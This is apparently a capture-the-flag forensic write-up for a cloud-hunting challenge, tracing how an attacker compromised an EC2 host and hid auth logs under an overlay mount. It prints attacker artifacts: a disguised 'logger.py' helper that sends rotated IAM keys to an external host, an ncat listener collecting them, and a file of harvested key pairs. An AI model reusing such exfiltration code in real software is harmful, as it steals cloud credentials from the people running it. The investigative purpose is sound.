---
tags:
  - EC2
  - OverlayFS
title: Cloud Hunting Games - Aint no mountain high enough to keep me away from my logs
description: Reveal the attacker ssh auth logs
reference: https://www.cloudhuntinggames.com/challenge/4
---

## Challenge

Great progress! As you continue your investigation, you discover that once the attacker compromised the EC2 machine, they were able to manipulate a Lambda function to gain access to multiple IAM users. ExfilCola has granted you root access to the EC2 machine where this activity originated from.

But the question remains - **how did the attacker gain access to this machine?**

Your task is to find the IP address of another ExfilCola workload that was used as the **initial entry point into the organization**.

## Solution


### 1. found two python code in `/home/postgresql_user` directory

The program will rotate the IAM user credentials and send the new credentials to `fetcher.exfilcola.io:8443` via UDP.

#### new_lambda_function.py

```python
import boto3
import os
import logging
import json
from logger import validate as logger_validate

# Configure logging
logger = logging.getLogger()
logger.setLevel("INFO")

iam = boto3.client('iam')
secrets_manager = boto3.client('secretsmanager')

SECRET_NAME = "IAMAccessKeys"

def store_secret(username, access_key, secret_key):
    try:
        secret_value = secrets_manager.get_secret_value(SecretId=SECRET_NAME)
        secret_dict = json.loads(secret_value['SecretString'])
    except secrets_manager.exceptions.ResourceNotFoundException:
        secret_dict = {}
    except Exception as e:
        logger.error(f"Error retrieving secret: {str(e)}")
        return
    
    secret_dict[username] = {
        "AccessKeyId": access_key,
        "SecretAccessKey": secret_key
    }
    
    try:
        secrets_manager.put_secret_value(
            SecretId=SECRET_NAME,
            SecretString=json.dumps(secret_dict)
        )
        logger.info(f"Stored new access key for {username} in Secrets Manager")
    except Exception as e:
        logger.error(f"Error storing secret for {username}: {str(e)}")

def rotate_access_key(username):
    try:
        logger.info(f"Rotating access key for user: {username}")
        
        # Get existing access keys
        response = iam.list_access_keys(UserName=username)
        access_keys = response['AccessKeyMetadata']
        
        if len(access_keys) == 0:
            logger.warning(f"No existing access keys found for {username}.")
            return
        
        # Create a new access key
        new_key = iam.create_access_key(UserName=username)
        new_access_key = new_key['AccessKey']['AccessKeyId']
        new_secret_key = new_key['AccessKey']['SecretAccessKey']
        
        logger.info(f"New access key created for {username}: {new_access_key}")
        
        # Store new credentials in AWS Secrets Manager
        store_secret(username, new_access_key, new_secret_key)
        
        # Disable old keys
        for key in access_keys:
            old_key_id = key['AccessKeyId']
            iam.update_access_key(UserName=username, AccessKeyId=old_key_id, Status='Inactive')
            logger.info(f"Disabled old access key for {username}: {old_key_id}")
        
        # Delete old keys
        for key in access_keys:
            old_key_id = key['AccessKeyId']
            iam.delete_access_key(UserName=username, AccessKeyId=old_key_id)
            logger.info(f"Deleted old access key for {username}: {old_key_id}")
        
        logger_validate({username, new_access_key, new_secret_key})
        logger.info(f"Successfully rotated access key for {username}")
    except Exception as e:
        logger.error(f"Error rotating access key for {username}: {str(e)}")

def lambda_handler(event, context):
    logger.info("Starting IAM access key rotation process.")
    iam_users = event.get("iam_users")
    if not iam_users:
        logger.error("No IAM users provided in event parameters.")
        return
    
    for user in iam_users:
        rotate_access_key(user)
    
    logger.info("IAM access key rotation process completed.")
```

#### logger.py

```python
import socket,os,pty,ssl
def validate(text):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        wrappedSocket = context.wrap_socket(s)
        wrappedSocket.connect(("fetcher.exfilcola.io",8443))
        wrappedSocket.send(repr(text).encode('utf-8'))
```

### 2. check the `sshd_config`

Nothing special was found.

```
root@ssh-fetcher:/etc/ssh# cat sshd_config

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# Expect .ssh/authorized_keys2 to be disregarded by default in future.
#AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
KbdInteractiveAuthentication no

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
#GSSAPIStrictAcceptorCheck yes
#GSSAPIKeyExchange no

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
UsePAM yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs serve
```

### 3. chec the bash history of `postgresql-user`

Got the lambda function name `log-service-status`

```
aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload {"service": "postgresql", "status": 2}
aws sts get-caller-identity
aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload {"service": "postgresql", "status": 2}
aws sts get-caller-identity
aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload {"service": "postgresql", "status": 1}
aws sts get-caller-identity
aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload {"service": "postgresql", "status": 2}
aws sts get-caller-identity
aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload {"service": "postgresql", "status": 2}
aws sts get-caller-identity
aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload {"service": "postgresql", "status": 3}
aws sts get-caller-identity
aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload {"service": "postgresql", "status": 3}
aws sts get-caller-identity
aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload {"service": "postgresql", "status": 1}
aws sts get-caller-identity
aws lambda invoke --function-name log-service-status --cli-binary-format raw-in-base64-out --payload {"service": "postgresql", "status": 2}
```

### 4. check if any hidden logs in `/var/log`

- found `.gK8du9`.
- the content of `.gK8du9` probably is a hint that the attacker deleted the logs.

```
root@ssh-fetcher:/etc/logrotate.d# ls -alt /var/log
total 12
drwxr-xr-x 1 root root 4096 Feb  1  1990 .
drwxr-xr-x 1 root root 4096 Feb  1  1990 ..
-rw-r--r-- 1 root root   25 Feb  1  1990 .gK8du9
root@ssh-fetcher:/etc/logrotate.d# cat /var/log/.gK8du9 
FizzShadows were here...
```

### 5. check the audit system

The audit system is disabled.

```
root@ssh-fetcher:/etc/systemd/system/multi-user.target.wants# /sbin/auditctl -l
The audit system is disabled
```

### 6. walk the file system randomly to find any suspicious files

found the `/tmp/...` directory.

```
root@ssh-fetcher:/tmp/...# ls
keys_out.txt  mnt
root@ssh-fetcher:/tmp/...# cat keys_out.txt 
{'AKIA6ODU25RAP6HSGF63', 'vA9CQ41DUV9f5+32OUaAe+vunxq3OD6PQzar6Cfa', 'lisa.king'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'AKIA6ODU25RAO2C5OWSJ', 'betty.gonzalez', 'HSf7QPhQzgSBJGTRmnOgv6O2rdviYOu5WX9q/cup'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'nancy.allen', 'AKIA6ODU25RAJGKLZQ7A', 'ZqC0ky7FAVB+b45qCosS2Pvaw5Q3FMw4FOv9Z96U'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'karen.scott', 'AKIA6ODU25RAN3TJDV5H', 'v/MHPl3XTLmFFpUo8FJugPT/ge2ubwyM7A/5pK3K'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'susan.harris', '3rHERzPk5mJP2kEDyXRUXf0zb6SxeAHABB4sKxmQ', 'AKIA6ODU25RAL3LMZYCS'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'anthony.wright', 'AKIA6ODU25RALLDFHYUB', 'niFZjNNol9XXBEAGa2pP8MHcPY/7ADWAYkD/GJUY'}NCAT DEBUG: SSL_read error on 5: error:00000005:lib(0)::reason(5)
{'AKIA6ODU25RAGSOOLZEC', 'mark.moore', 'Va3NV1++UJtPmLkUoGJ1zoq/AINpr5xZ/sjm4+Hd'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'wdk/2T1NfdsFR+00X+2Vw5myPAxRFRruYB+MzclV', 'AKIA6ODU25RAPGN42TWC', 'margaret.jackson'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'barbara.thompson', '4LLD98FMBcS6ImKeaJuiuq1cLimrOrK3xhwyunD0', 'AKIA6ODU25RAFXODMMVO'}NCAT DEBUG: SSL_read error on 5: error:00000005:lib(0)::reason(5)
{'robert.robinson', '/AFWJME54GSIeiMx7ynOPLqP7pNmhiVPASS/EiwN', 'AKIA6ODU25RAKWNGJORE'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'AKIA6ODU25RAECGA3MEI', 'daniel.lopez', 'kKSEmG3gSq0/jQ3r3TZeTXe5L8Ap7vvY9T0xHF8V'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'SjpnM3BektzmbgLw8h3zi7a607cPBaH3NVkJw5EW', 'kimberly.young', 'AKIA6ODU25RACUJU64WX'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'AKIA6ODU25RAHI6E6FMM', 'steven.thomas', 'UL+72sT9U0znZ9OGOaLDdLU805LGH60gPN1/YrVH'}NCAT DEBUG: SSL_read error on 5: error:00000005:lib(0)::reason(5)
{'AKIA6ODU25RAPDX6RYXU', 'david.perez', 'bMEZV1dJgfmOPxo0E8F/m6S0JCQMBmmsno9PGHks'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'Moe.Jito', 'fvLojkoomOIeF3InIciqUpfDiCiBm3Gh2XXJBdwl', 'AKIA7ODU35RAFS43L26J'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'AKIA6ODU25RAHV6DQ6HS', 'andrew.lee', 'rGiJ9qieHt24eDmG97p9Wd/BX108KUOoMd8+sl2L'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'donna.anderson', 'PQs5EZhYTjfymc+RLMWH81CCm8AVHCDu7duIiOvw', 'AKIA6ODU25RAJHZW5SGS'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'wP8Aq3tOpJU1KXHvCfzpQKB6doCheJxp6i0nw5g6', 'AKIA6ODU25RAIJOLJ6CC', 'jennifer.sanchez'}NCAT DEBUG: SSL_read error on 5: error:00000005:lib(0)::reason(5)
{'AKIA6ODU25RACQECW4A6', 'donald.smith', 'VyPTuQBEBo/WbuYcJuLJVlDLiq+ivxmKv4EqEyDk'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'linda.garcia', 'AKIA6ODU25RAMFFCCFEX', '9S6+ht/y4WXDqEQ01wYRr6oDRk+CtyZ8bkMF4F2J'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
{'elizabeth.ramirez', 'AKIA6ODU25RAN22NBRWP', '/yUL6hUHamAsQdrAZup3WGm/MjrYEji69aTVPght'}NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)root@ssh-fetcher:/tmp/...# ls
keys_out.txt  mnt
root@ssh-fetcher:/tmp/...# cd mnt/
root@ssh-fetcher:/tmp/.../mnt# ls
root@ssh-fetcher:/tmp/.../mnt# ls -alt
total 12
drwxr-xr-x 1 root root 4096 Feb  1  1990 .
drwxr-xr-x 1 root root 4096 Feb  1  1990 ..
-rw-r--r-- 1 root root   25 Feb  1  1990 .gK8du9
root@ssh-fetcher:/tmp/.../mnt# cat .gK8du9 
FizzShadows were here...
root@ssh-fetcher:/tmp/.../mnt# cd ..
root@ssh-fetcher:/tmp/...# ls -alt
total 16
drwxr-xr-x 1 root root 4096 Feb  1  1990 .
drwxrwxrwt 1 root root 4096 Feb  1  1990 ..
-rw-r--r-- 1 root root 3164 Feb  1  1990 keys_out.txt
drwxr-xr-x 1 root root 4096 Feb  1  1990 mnt
```

### 6. found `postgresql-user` can become `root` without password

```
root@ssh-fetcher:/etc/sudoers.d# cat postgresql-user 
postgresql-user ALL=(ALL) NOPASSWD:ALL
```

### 7. check the head of bash history of `postgresql-user`

This machine runs a tcp `server` on port `8443` that receive keys from the attacker program.

```
findmnt
nohup ncat --ssl -klp 8443 > /tmp/.../keys_out.txt &
cat /tmp/.../keys_out.txt
```

### 8. run `findmnt`

the `/var/log` has two mount points, one is read-writeable, one is read only.

```
-user/.ssh# findmnt
TARGET       SOURCE                            FSTYPE OPTIONS
/            overlay[/work/rootfs]             overla ro,relatime,lowerd
|-/var/log   overlay[/work/storage/66e1b2b7-074b-43d1-b437-abf35e284718/log]
|                                              overla rw,relatime,lowerd
| `-/var/log overlay[/work/rootfs/tmp/.../mnt] overla ro,relatime,lowerd
|-/dev/null  tmpfs[/null]                      tmpfs  rw,nosuid,size=655
`-/proc      none                              proc   ro,relatime
```

### 9. Try to unmout `/var/log` to getting logs from `/work/rootfs`

```
root@ssh-fetcher:~# umount /var/log
root@ssh-fetcher:~# cd /var/log
root@ssh-fetcher:/var/log# ls
apt  audit  auth.log  btmp  faillog  health.log  lastlog  wtmp
```

### 10. check the `auth.log` about `postgresql-user`

IP: `102.54.197.238`

```
root@ssh-fetcher:/var/log# cat auth.log | grep postgresql-user | head     
2025-05-02T00:14:01.000000+00:00 ip-172-31-85-120 sshd[197699]: Accepted publickey for postgresql-user from 102.54.197.238 port 47575 ssh2: RSA SHA256:1sVy+mmbCnbqW8Aw09mk4x6qHK2rpZxfA2d6gvF0Byc
2025-05-02T00:14:01.000000+00:00 ip-172-31-85-120 sshd[197699]: pam_unix(sshd:session): session opened for user postgresql-user(uid=1031) by (uid=0)
2025-05-02T00:16:55.000000+00:00 ip-172-31-85-120 sshd[184336]: Accepted publickey for postgresql-user from 102.54.197.238 port 60373 ssh2: RSA SHA256:1sVy+mmbCnbqW8Aw09mk4x6qHK2rpZxfA2d6gvF0Byc
2025-05-02T00:16:55.000000+00:00 ip-172-31-85-120 sshd[184336]: pam_unix(sshd:session): session opened for user postgresql-user(uid=1045) by (uid=0)
2025-05-02T00:17:13.000000+00:00 ip-172-31-85-120 sshd[123958]: Accepted publickey for postgresql-user from 102.54.197.238 port 61333 ssh2: RSA SHA256:1sVy+mmbCnbqW8Aw09mk4x6qHK2rpZxfA2d6gvF0Byc
2025-05-02T00:17:13.000000+00:00 ip-172-31-85-120 sshd[123958]: pam_unix(sshd:session): session opened for user postgresql-user(uid=1028) by (uid=0)
2025-05-02T00:17:27.000000+00:00 ip-172-31-85-120 sshd[197700]: Disconnected from user postgresql-user 102.54.197.238 port 47575
2025-05-02T00:17:27.000000+00:00 ip-172-31-85-120 sshd[197699]: pam_unix(sshd:session): session closed for user postgresql-user
2025-05-02T00:21:21.000000+00:00 ip-172-31-85-120 sshd[123959]: Disconnected from user postgresql-user 102.54.197.238 port 61333
2025-05-02T00:21:21.000000+00:00 ip-172-31-85-120 sshd[123958]: pam_unix(sshd:session): session closed for user postgresql-user
```